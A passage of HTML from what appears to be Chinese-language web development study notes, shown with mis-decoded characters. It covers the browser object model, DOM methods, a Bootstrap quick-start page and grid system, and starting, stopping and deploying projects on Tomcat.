æµè§ˆå™¨å¯¹è±¡æ¨¡å‹</p><ul><li>å°†æµè§ˆå™¨çš„å„ä¸ªç»„æˆéƒ¨åˆ†å°è£…æˆå¯¹è±¡ã€‚</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4hd1zeqvkj213q0mg0v7.jpg"                      alt="image-20220724011212914"                ><figcaption>image-20220724011212914</figcaption></figure></p><h3 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h3><ul><li>Windowï¼šçª—å£å¯¹è±¡</li></ul><ul><li>Navigatorï¼šæµè§ˆå™¨å¯¹è±¡</li><li>Screenï¼šæ˜¾ç¤ºå™¨å±å¹•å¯¹è±¡</li><li>Historyï¼šå†å²è®°å½•å¯¹è±¡</li><li>Locationï¼šåœ°å€æ å¯¹è±¡</li></ul><h3 id="Windowï¼šçª—å£å¯¹è±¡"><a href="#Windowï¼šçª—å£å¯¹è±¡" class="headerlink" title="Windowï¼šçª—å£å¯¹è±¡"></a>Windowï¼šçª—å£å¯¹è±¡</h3><ol><li><p>åˆ›å»º</p></li><li><p>æ–¹æ³•</p><ol><li>ä¸å¼¹å‡ºæ¡†æœ‰å…³çš„æ–¹æ³•ï¼š<ul><li>alert()æ˜¾ç¤ºå¸¦æœ‰ä¸€æ®µæ¶ˆæ¯å’Œä¸€ä¸ªç¡®è®¤æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚</li><li>confirm()æ˜¾ç¤ºå¸¦æœ‰ä¸€æ®µæ¶ˆæ¯ä»¥åŠç¡®è®¤æŒ‰é’®å’Œå–æ¶ˆæŒ‰é’®çš„å¯¹è¯æ¡†ã€‚<ul><li>å¦‚æœç”¨æˆ·ç‚¹å‡»ç¡®å®šæŒ‰é’®ï¼Œåˆ™æ–¹æ³•è¿”å›true</li><li>å¦‚æœç”¨æˆ·ç‚¹å‡»å–æ¶ˆæŒ‰é’®ï¼Œåˆ™æ–¹æ³•è¿”å›false</li></ul></li><li>prompt()æ˜¾ç¤ºå¯æç¤ºç”¨æˆ·è¾“å…¥çš„å¯¹è¯æ¡†ã€‚<ul><li>è¿”å›å€¼ï¼šè·å–ç”¨æˆ·è¾“å…¥çš„å€¼</li></ul></li></ul></li><li>ä¸æ‰“å¼€å…³é—­æœ‰å…³çš„æ–¹æ³•ï¼š<ul><li>close()å…³é—­æµè§ˆå™¨çª—å£ã€‚<ul><li>è°è°ƒç”¨æˆ‘ ï¼Œæˆ‘å…³è°</li></ul></li><li>open()æ‰“å¼€ä¸€ä¸ªæ–°çš„æµè§ˆå™¨çª—å£<ul><li>è¿”å›æ–°çš„Windowå¯¹è±¡</li></ul></li></ul></li><li>ä¸å®šæ—¶å™¨æœ‰å…³çš„æ–¹å¼<ul><li>setTimeout()åœ¨æŒ‡å®šçš„æ¯«ç§’æ•°åè°ƒç”¨å‡½æ•°æˆ–è®¡ç®—è¡¨è¾¾å¼ã€‚<ul><li>å‚æ•°ï¼š<ol><li>jsä»£ç æˆ–è€…æ–¹æ³•å¯¹è±¡</li><li>æ¯«ç§’å€¼</li></ol></li><li>è¿”å›å€¼ï¼šå”¯ä¸€æ ‡è¯†ï¼Œç”¨äºå–æ¶ˆå®šæ—¶å™¨</li></ul></li><li>clearTimeout()å–æ¶ˆç”± setTimeout() æ–¹æ³•è®¾ç½®çš„ timeoutã€‚</li><li>setInterval()æŒ‰ç…§æŒ‡å®šçš„å‘¨æœŸï¼ˆä»¥æ¯«ç§’è®¡ï¼‰æ¥è°ƒç”¨å‡½æ•°æˆ–è®¡ç®—è¡¨è¾¾å¼ã€‚</li><li>clearInterval()å–æ¶ˆç”± setInterval() è®¾ç½®çš„ timeoutã€‚</li></ul></li></ol></li><li><p>å±æ€§ï¼š</p><ol><li>è·å–å…¶ä»–BOMå¯¹è±¡ï¼š<br>history<br>location<br>Navigator<br>Screen:</li><li>è·å–DOMå¯¹è±¡<br>document</li></ol></li><li><p>ç‰¹ç‚¹</p><ul><li>Windowå¯¹è±¡ä¸éœ€è¦åˆ›å»ºå¯ä»¥ç›´æ¥ä½¿ç”¨ windowä½¿ç”¨ã€‚ window.æ–¹æ³•å();</li><li>windowå¼•ç”¨å¯ä»¥çœç•¥ã€‚  æ–¹æ³•å();</li></ul></li></ol><h3 id="Locationï¼šåœ°å€æ å¯¹è±¡"><a href="#Locationï¼šåœ°å€æ å¯¹è±¡" class="headerlink" title="Locationï¼šåœ°å€æ å¯¹è±¡"></a>Locationï¼šåœ°å€æ å¯¹è±¡</h3><ol><li><p>åˆ›å»º(è·å–)ï¼š</p><ol><li>window.location</li><li>location</li></ol></li><li><p>æ–¹æ³•ï¼š</p><ul><li>reload()é‡æ–°åŠ è½½å½“å‰æ–‡æ¡£ã€‚åˆ·æ–°</li></ul></li><li><p>å±æ€§</p><ul><li>hrefè®¾ç½®æˆ–è¿”å›å®Œæ•´çš„ URLã€‚</li></ul></li></ol><h3 id="Historyï¼šå†å²è®°å½•å¯¹è±¡"><a href="#Historyï¼šå†å²è®°å½•å¯¹è±¡" class="headerlink" title="Historyï¼šå†å²è®°å½•å¯¹è±¡"></a>Historyï¼šå†å²è®°å½•å¯¹è±¡</h3><p>æŒ‡å½“å‰windowsçª—å£è®¿é—®çš„è®°å½•</p><ol><li><p>åˆ›å»º(è·å–)ï¼š</p><ol><li>window.history</li><li>history</li></ol></li><li><p>æ–¹æ³•ï¼š</p><ul><li>back()åŠ è½½ history åˆ—è¡¨ä¸­çš„å‰ä¸€ä¸ª URLã€‚</li><li>forward()åŠ è½½ history åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ª URLã€‚</li><li>go(å‚æ•°)åŠ è½½ history åˆ—è¡¨ä¸­çš„æŸä¸ªå…·ä½“é¡µé¢ã€‚<ul><li>å‚æ•°ï¼š<ul><li>æ­£æ•°ï¼šå‰è¿›å‡ ä¸ªå†å²è®°å½•</li><li>è´Ÿæ•°ï¼šåé€€å‡ ä¸ªå†å²è®°å½•</li></ul></li></ul></li></ul></li><li><p>å±æ€§ï¼š</p><ul><li>lengthè¿”å›å½“å‰çª—å£å†å²åˆ—è¡¨ä¸­çš„ URL æ•°é‡ã€‚</li></ul></li></ol><h1 id="DOM-1"><a href="#DOM-1" class="headerlink" title="DOM"></a>DOM</h1><h2 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ul><li><p>æ¦‚å¿µï¼š Document Object Model æ–‡æ¡£å¯¹è±¡æ¨¡å‹</p><ul><li>å°†æ ‡è®°è¯­è¨€æ–‡æ¡£çš„å„ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå°è£…ä¸ºå¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨è¿™äº›å¯¹è±¡ï¼Œå¯¹æ ‡è®°è¯­è¨€æ–‡æ¡£è¿›è¡ŒCRUDçš„åŠ¨æ€æ“ä½œ</li></ul></li><li><p>W3C DOM æ ‡å‡†è¢«åˆ†ä¸º 3 ä¸ªä¸åŒçš„éƒ¨åˆ†ï¼š</p><ul><li>æ ¸å¿ƒ DOM - é’ˆå¯¹ä»»ä½•ç»“æ„åŒ–æ–‡æ¡£çš„æ ‡å‡†æ¨¡å‹<ul><li><p>Documentï¼šæ–‡æ¡£å¯¹è±¡</p></li><li><p>Elementï¼šå…ƒç´ å¯¹è±¡</p></li><li><p>Attributeï¼šå±æ€§å¯¹è±¡</p></li><li><p>Textï¼šæ–‡æœ¬å¯¹è±¡(ä¸èƒ½æœ‰å­èŠ‚ç‚¹)</p></li><li><p>Comment:æ³¨é‡Šå¯¹è±¡</p></li><li><p>Nodeï¼šèŠ‚ç‚¹å¯¹è±¡ï¼Œå…¶ä»–5ä¸ªçš„çˆ¶å¯¹è±¡</p></li></ul></li><li>XML DOM - é’ˆå¯¹ XML æ–‡æ¡£çš„æ ‡å‡†æ¨¡å‹</li><li>HTML DOM - é’ˆå¯¹ HTML æ–‡æ¡£çš„æ ‡å‡†æ¨¡å‹</li></ul></li></ul><h2 id="æ ¸å¿ƒDOMæ¨¡å‹"><a href="#æ ¸å¿ƒDOMæ¨¡å‹" class="headerlink" title="æ ¸å¿ƒDOMæ¨¡å‹"></a>æ ¸å¿ƒDOMæ¨¡å‹</h2><h3 id="Documentï¼šæ–‡æ¡£å¯¹è±¡"><a href="#Documentï¼šæ–‡æ¡£å¯¹è±¡" class="headerlink" title="Documentï¼šæ–‡æ¡£å¯¹è±¡"></a>Documentï¼šæ–‡æ¡£å¯¹è±¡</h3><ol><li>åˆ›å»º(è·å–)ï¼šåœ¨html domæ¨¡å‹ä¸­å¯ä»¥ä½¿ç”¨windowå¯¹è±¡æ¥è·å–<br>1. window.document<br> 2. document</li><li>æ–¹æ³•ï¼š<ol><li>è·å–Elementå¯¹è±¡ï¼š<ol><li>getElementById()ï¼š æ ¹æ®idå±æ€§å€¼è·å–å…ƒç´ å¯¹è±¡ã€‚idå±æ€§å€¼ä¸€èˆ¬å”¯ä¸€</li><li>getElementsByTagName()ï¼šæ ¹æ®æ ‡ç­¾åç§°è·å–å…ƒç´ å¯¹è±¡ä»¬ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°ç»„</li><li>getElementsByClassName():æ ¹æ®Classå±æ€§å€¼è·å–å…ƒç´ å¯¹è±¡ä»¬ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°ç»„</li><li>getElementsByName(): æ ¹æ®nameå±æ€§å€¼è·å–å…ƒç´ å¯¹è±¡ä»¬ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°ç»„</li></ol></li><li>åˆ›å»ºå…¶ä»–DOMå¯¹è±¡ï¼š<ul><li>createAttribute(name)</li><li>createComment()</li><li>createElement()</li><li>createTextNode()</li></ul></li><li>å±æ€§</li></ol></li></ol><h3 id="Elementï¼šå…ƒç´ å¯¹è±¡"><a href="#Elementï¼šå…ƒç´ å¯¹è±¡" class="headerlink" title="Elementï¼šå…ƒç´ å¯¹è±¡"></a>Elementï¼šå…ƒç´ å¯¹è±¡</h3><ol><li>è·å–/åˆ›å»ºï¼šé€šè¿‡documentæ¥è·å–å’Œåˆ›å»º</li><li>æ–¹æ³•ï¼š<ol><li>removeAttribute()ï¼šåˆ é™¤å±æ€§</li><li>setAttribute()ï¼šè®¾ç½®å±æ€§</li></ol></li></ol><h3 id="Nodeï¼šèŠ‚ç‚¹å¯¹è±¡ï¼Œå…¶ä»–5ä¸ªçš„çˆ¶å¯¹è±¡"><a href="#Nodeï¼šèŠ‚ç‚¹å¯¹è±¡ï¼Œå…¶ä»–5ä¸ªçš„çˆ¶å¯¹è±¡" class="headerlink" title="Nodeï¼šèŠ‚ç‚¹å¯¹è±¡ï¼Œå…¶ä»–5ä¸ªçš„çˆ¶å¯¹è±¡"></a>Nodeï¼šèŠ‚ç‚¹å¯¹è±¡ï¼Œå…¶ä»–5ä¸ªçš„çˆ¶å¯¹è±¡</h3><pre><code>* ç‰¹ç‚¹ï¼šæ‰€æœ‰domå¯¹è±¡éƒ½å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªèŠ‚ç‚¹* æ–¹æ³•ï¼š    * CRUD domæ ‘ï¼š        * appendChild()ï¼šå‘èŠ‚ç‚¹çš„å­èŠ‚ç‚¹åˆ—è¡¨çš„ç»“å°¾æ·»åŠ æ–°çš„å­èŠ‚ç‚¹ã€‚        * removeChild()ï¼šåˆ é™¤ï¼ˆå¹¶è¿”å›ï¼‰å½“å‰èŠ‚ç‚¹çš„æŒ‡å®šå­èŠ‚ç‚¹ã€‚        * replaceChild()ï¼šç”¨æ–°èŠ‚ç‚¹æ›¿æ¢ä¸€ä¸ªå­èŠ‚ç‚¹ã€‚* å±æ€§ï¼š    * parentNode è¿”å›èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‚</code></pre><h3 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h3><ol><li><p>æ ‡ç­¾ä½“çš„è®¾ç½®å’Œè·å–ï¼šinnerHTML</p></li><li><p>ä½¿ç”¨htmlå…ƒç´ å¯¹è±¡çš„å±æ€§</p></li><li><p>æ§åˆ¶å…ƒç´ æ ·å¼</p><ol><li><p>ä½¿ç”¨å…ƒç´ çš„styleå±æ€§æ¥è®¾ç½®<br>å¦‚ï¼š</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¿®æ”¹æ ·å¼æ–¹å¼1</span></span><br><span class="line">div1.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&quot;1px solid red&quot;</span>;</span><br><span class="line">div1.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;200px&quot;</span>;</span><br><span class="line"><span class="comment">//font-size--&gt; fontSize</span></span><br><span class="line">div1.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;20px&quot;</span>;</span><br></pre></td></tr></table></figure></div></li><li><p>æå‰å®šä¹‰å¥½ç±»é€‰æ‹©å™¨çš„æ ·å¼ï¼Œé€šè¿‡å…ƒç´ çš„classNameå±æ€§æ¥è®¾ç½®å…¶classå±æ€§å€¼ã€‚</p></li></ol></li></ol><h1 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h1><h2 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><ol><li>æ¦‚å¿µï¼š ä¸€ä¸ªå‰ç«¯å¼€å‘çš„æ¡†æ¶ï¼ŒBootstrapï¼Œæ¥è‡ª Twitterï¼Œæ˜¯ç›®å‰å¾ˆå—æ¬¢è¿çš„å‰ç«¯æ¡†æ¶ã€‚Bootstrap æ˜¯åŸºäº HTMLã€CSSã€JavaScript çš„ï¼Œå®ƒç®€æ´çµæ´»ï¼Œä½¿å¾— Web å¼€å‘æ›´åŠ å¿«æ·ã€‚<ul><li>æ¡†æ¶:ä¸€ä¸ªåŠæˆå“è½¯ä»¶ï¼Œå¼€å‘äººå‘˜å¯ä»¥åœ¨æ¡†æ¶åŸºç¡€ä¸Šï¼Œåœ¨è¿›è¡Œå¼€å‘ï¼Œç®€åŒ–ç¼–ç ã€‚</li><li>å¥½å¤„ï¼š<ol><li>å®šä¹‰äº†å¾ˆå¤šçš„cssæ ·å¼å’Œjsæ’ä»¶ã€‚æˆ‘ä»¬å¼€å‘äººå‘˜ç›´æ¥å¯ä»¥ä½¿ç”¨è¿™äº›æ ·å¼å’Œæ’ä»¶å¾—åˆ°ä¸°å¯Œçš„é¡µé¢æ•ˆæœã€‚</li><li>å“åº”å¼å¸ƒå±€ã€‚<ul><li>åŒä¸€å¥—é¡µé¢å¯ä»¥å…¼å®¹ä¸åŒåˆ†è¾¨ç‡çš„è®¾å¤‡ã€‚</li></ul></li></ol></li></ul></li></ol><h2 id="å¿«é€Ÿå…¥é—¨-2"><a href="#å¿«é€Ÿå…¥é—¨-2" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h2><ol><li>ä¸‹è½½Bootstrap</li><li>åœ¨é¡¹ç›®ä¸­å°†è¿™ä¸‰ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶</li><li>åˆ›å»ºhtmlé¡µé¢ï¼Œå¼•å…¥å¿…è¦çš„èµ„æºæ–‡ä»¶</li></ol><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ä¸Šè¿°3ä¸ªmetaæ ‡ç­¾*å¿…é¡»*æ”¾åœ¨æœ€å‰é¢ï¼Œä»»ä½•å…¶ä»–å†…å®¹éƒ½*å¿…é¡»*è·Ÿéšå…¶åï¼ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bootstrap test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/bootstrap.min.css&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- jQuery (Bootstrap çš„æ‰€æœ‰ JavaScript æ’ä»¶éƒ½ä¾èµ– jQueryï¼Œæ‰€ä»¥å¿…é¡»æ”¾åœ¨å‰è¾¹) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/jquery-3.2.1.min.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- åŠ è½½ Bootstrap çš„æ‰€æœ‰ JavaScript æ’ä»¶ã€‚ä½ ä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦åªåŠ è½½å•ä¸ªæ’ä»¶ã€‚ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./js/bootstrap.min.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>ä½ å¥½ï¼Œä¸–ç•Œï¼<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="å“åº”å¼å¸ƒå±€"><a href="#å“åº”å¼å¸ƒå±€" class="headerlink" title="å“åº”å¼å¸ƒå±€"></a>å“åº”å¼å¸ƒå±€</h2><ul><li><p>åŒä¸€å¥—é¡µé¢å¯ä»¥å…¼å®¹ä¸åŒåˆ†è¾¨ç‡çš„è®¾å¤‡ã€‚</p></li><li><p>å®ç°ï¼šä¾èµ–äºæ …æ ¼ç³»ç»Ÿï¼šå°†ä¸€è¡Œå¹³å‡åˆ†æˆ12ä¸ªæ ¼å­ï¼Œå¯ä»¥æŒ‡å®šå…ƒç´ å å‡ ä¸ªæ ¼å­</p></li><li><p>æ­¥éª¤ï¼š</p><ol><li>å®šä¹‰å®¹å™¨ã€‚ç›¸å½“äºä¹‹å‰çš„tableã€<ul><li>å®¹å™¨åˆ†ç±»ï¼š<ol><li>containerï¼šä¸¤è¾¹ç•™ç™½</li><li>container-fluidï¼šæ¯ä¸€ç§è®¾å¤‡éƒ½æ˜¯100%å®½åº¦</li></ol></li></ul></li><li>å®šä¹‰è¡Œã€‚ç›¸å½“äºä¹‹å‰çš„tr   æ ·å¼ï¼šrow</li><li>å®šä¹‰å…ƒç´ ã€‚æŒ‡å®šè¯¥å…ƒç´ åœ¨ä¸åŒçš„è®¾å¤‡ä¸Šï¼Œæ‰€å çš„æ ¼å­æ•°ç›®ã€‚æ ·å¼ï¼šcol-è®¾å¤‡ä»£å·-æ ¼å­æ•°ç›®<ul><li>è®¾å¤‡ä»£å·ï¼š<ol><li>xsï¼šè¶…å°å±å¹• æ‰‹æœº (<768px)ï¼š<code>col-xs-12</code></li><li>smï¼šå°å±å¹• å¹³æ¿ (â‰¥768px)</li><li>mdï¼šä¸­ç­‰å±å¹• æ¡Œé¢æ˜¾ç¤ºå™¨ (â‰¥992px)</li><li>lgï¼šå¤§å±å¹• å¤§æ¡Œé¢æ˜¾ç¤ºå™¨ (â‰¥1200px)</li></ol></li></ul></li></ol><ul><li>æ³¨æ„ï¼š<ol><li>ä¸€è¡Œä¸­å¦‚æœæ ¼å­æ•°ç›®è¶…è¿‡12ï¼Œåˆ™è¶…å‡ºéƒ¨åˆ†è‡ªåŠ¨æ¢è¡Œã€‚</li><li>æ …æ ¼ç±»å±æ€§å¯ä»¥å‘ä¸Šå…¼å®¹ã€‚æ …æ ¼ç±»é€‚ç”¨äºä¸å±å¹•å®½åº¦å¤§äºæˆ–ç­‰äºåˆ†ç•Œç‚¹å¤§å°çš„è®¾å¤‡ã€‚</li><li>å¦‚æœçœŸå®è®¾å¤‡å®½åº¦å°äºäº†è®¾ç½®æ …æ ¼ç±»å±æ€§çš„è®¾å¤‡ä»£ç çš„æœ€å°å€¼ï¼Œä¼šä¸€ä¸ªå…ƒç´ å æ»¡ä¸€æ•´è¡Œã€‚</li></ol></li></ul></li></ul><h2 id="CSSæ ·å¼å’ŒJSæ’ä»¶"><a href="#CSSæ ·å¼å’ŒJSæ’ä»¶" class="headerlink" title="CSSæ ·å¼å’ŒJSæ’ä»¶"></a>CSSæ ·å¼å’ŒJSæ’ä»¶</h2><ol><li><p>å…¨å±€CSSæ ·å¼ï¼š</p><ul><li><p>æŒ‰é’®ï¼šclass="btn btn-default"</p></li><li><p>å›¾ç‰‡ï¼š</p><ul><li>class="img-responsive"ï¼šå›¾ç‰‡åœ¨ä»»æ„å°ºå¯¸éƒ½å 100%</li><li>å›¾ç‰‡å½¢çŠ¶<ul><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../../../Desktop/       /webå­¦ä¹ /ğŸ“’/..."                      alt="..." class="img-rounded"                ><figcaption>...</figcaption></figure>ï¼šæ–¹å½¢</li><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../../../Desktop/       /webå­¦ä¹ /ğŸ“’/..."                      alt="..." class="img-circle"                ><figcaption>...</figcaption></figure> ï¼š åœ†å½¢</li><li><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../../../Desktop/       /webå­¦ä¹ /ğŸ“’/..."                      alt="..." class="img-thumbnail"                ><figcaption>...</figcaption></figure> ï¼šç›¸æ¡†</li></ul></li></ul><blockquote><p>ä¸€ä¸ªæ ‡ç­¾å¯ä»¥æœ‰å¤šä¸ªclasså±æ€§</p><p>altå±æ€§æä¾›æ›¿ä»£å›¾ç‰‡çš„ä¿¡æ¯ï¼Œä½¿å±å¹•é˜…è¯»å™¨èƒ½è·å–åˆ°å…³äºå›¾ç‰‡çš„ä¿¡æ¯</p></blockquote></li><li><p>è¡¨æ ¼</p><ul><li>table</li><li>table-bordered</li><li>table-hover</li></ul></li><li><p>è¡¨å•</p><ul><li>ç»™è¡¨å•é¡¹æ·»åŠ ï¼šclass="form-control"</li></ul></li></ul></li><li><p>ç»„ä»¶ï¼š</p><ul><li>å¯¼èˆªæ¡</li><li>åˆ†é¡µæ¡</li></ul></li><li><p>æ’ä»¶ï¼š</p><ul><li>è½®æ’­å›¾</li></ul></li></ol><h2 id="ä¸€äº›æ³¨æ„äº‹é¡¹"><a href="#ä¸€äº›æ³¨æ„äº‹é¡¹" class="headerlink" title="ä¸€äº›æ³¨æ„äº‹é¡¹"></a>ä¸€äº›æ³¨æ„äº‹é¡¹</h2><ul><li>èµ‹å€¼å‡½æ•°æ—¶ï¼Œä¸è¦åŠ æ‹¬å·ï¼Œåªå†™å‡½æ•°åæ‰è¡¨ç¤ºå¯¹è±¡</li></ul><h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h2 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h2><p>tomcat binç›®å½•ä¸‹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./startup.sh</span><br></pre></td></tr></table></figure></div><p>è®¿é—®localhost:8080</p><blockquote><p>å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶è®¾ç½®ç«¯å£ä¸º80ï¼Œ80ç«¯å£å·æ˜¯httpåè®®çš„é»˜è®¤ç«¯å£å·ï¼Œè®¿é—®ç½‘å€ä¸éœ€è¦åŠ ç«¯å£å·</p></blockquote><h2 id="å…³é—­"><a href="#å…³é—­" class="headerlink" title="å…³é—­"></a>å…³é—­</h2><p>tomcat binç›®å½•ä¸‹</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./shutdown.sh</span><br></pre></td></tr></table></figure></div><h2 id="éƒ¨ç½²é¡¹ç›®æ–¹å¼"><a href="#éƒ¨ç½²é¡¹ç›®æ–¹å¼" class="headerlink" title="éƒ¨ç½²é¡¹ç›®æ–¹å¼"></a>éƒ¨ç½²é¡¹ç›®æ–¹å¼</h2><h3 id="1-ç›´æ¥å°†é¡¹ç›®æ”¾åˆ°webappsç›®å½•ä¸‹å³å¯"><a href="#1-ç›´æ¥å°†é¡¹ç›®æ”¾åˆ°webappsç›®å½•ä¸‹å³å¯" class="headerlink" title="1.ç›´æ¥å°†é¡¹ç›®æ”¾åˆ°webappsç›®å½•ä¸‹å³å¯"></a>1.ç›´æ¥å°†é¡¹ç›®æ”¾åˆ°webappsç›®å½•ä¸‹å³å¯</h3><p>é¡¹ç›®ä»¥æ–‡ä»¶å¤¹åˆ†å¼€</p><ul><li>/helloï¼šé¡¹ç›®çš„è®¿é—®è·¯å¾„-->è™šæ‹Ÿç›®å½•</li><li>ç®€åŒ–éƒ¨ç½²ï¼šå°†é¡¹ç›®æ‰“æˆä¸€ä¸ªwaråŒ…ï¼Œå†å°†waråŒ…æ”¾ç½®åˆ°webappsç›®å½•ä¸‹ã€‚<br>- waråŒ…ä¼šè‡ªåŠ¨è§£å‹ç¼©</li></ul><blockquote><p>waråŒ…åŠ å…¥webappsç›®å½•æ—¶ä¼šè‡ªåŠ¨æ·»åŠ åŒåæ–‡ä»¶å¤¹ï¼Œåˆ é™¤waråŒ…ä¹Ÿä¼šè‡ªåŠ¨åˆ é™¤æ–‡ä»¶å¤¹</p></blockquote><h3 id="2-é…ç½®conf-server-xmlæ–‡ä»¶"><a href="#2-é…ç½®conf-server-xmlæ–‡ä»¶" class="headerlink" title="2.é…ç½®conf/server.xmlæ–‡ä»¶"></a>2.é…ç½®conf/server.xmlæ–‡ä»¶</h3><p>åœ¨<Host>æ ‡ç­¾ä½“ä¸­é…ç½®<br><code>&lt;Context docBase=&quot;D:\hello&quot; path=&quot;/hehe&quot; /&gt;</code></p><ul><li>docBase:é¡¹ç›®å­˜æ”¾çš„è·¯å¾„</li><li>pathï¼šè™šæ‹Ÿç›®å½•</li></ul><blockquote><p>ç½‘é¡µè®¿é—®çš„æ—¶å€™ç”¨è™šæ‹Ÿç›®å½•</p><p>ä½†ä¸å®‰å…¨,ä¿®æ”¹server.xmlå¿…é¡»é‡å¯tomcat</p></blockquote><h3 id="3-åœ¨conf-Catalina-localhoståˆ›å»ºä»»æ„åç§°çš„xmlæ–‡ä»¶ã€‚"><a href="#3-åœ¨conf-Catalina-localhoståˆ›å»ºä»»æ„åç§°çš„xmlæ–‡ä»¶ã€‚" class="headerlink" title="3.åœ¨conf\Catalina\localhoståˆ›å»ºä»»æ„åç§°çš„xmlæ–‡ä»¶ã€‚"></a>3.åœ¨conf\Catalina\localhoståˆ›å»ºä»»æ„åç§°çš„xmlæ–‡ä»¶ã€‚</h3><p>åœ¨æ–‡ä»¶ä¸­ç¼–å†™</p><p><code>&lt;Context docBase=&quot;D:\hello&quot; /&gt;</code></p><ul><li>è™šæ‹Ÿç›®å½•ï¼šxmlæ–‡ä»¶çš„åç§°</li></ul><blockquote><p>æ¯”å¦‚åˆ›å»ºäº†context.xmlåœ¨localhostæ–‡ä»¶å¤¹ä¸‹ï¼Œå†…å®¹ä¸º</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">docBase</span>=<span 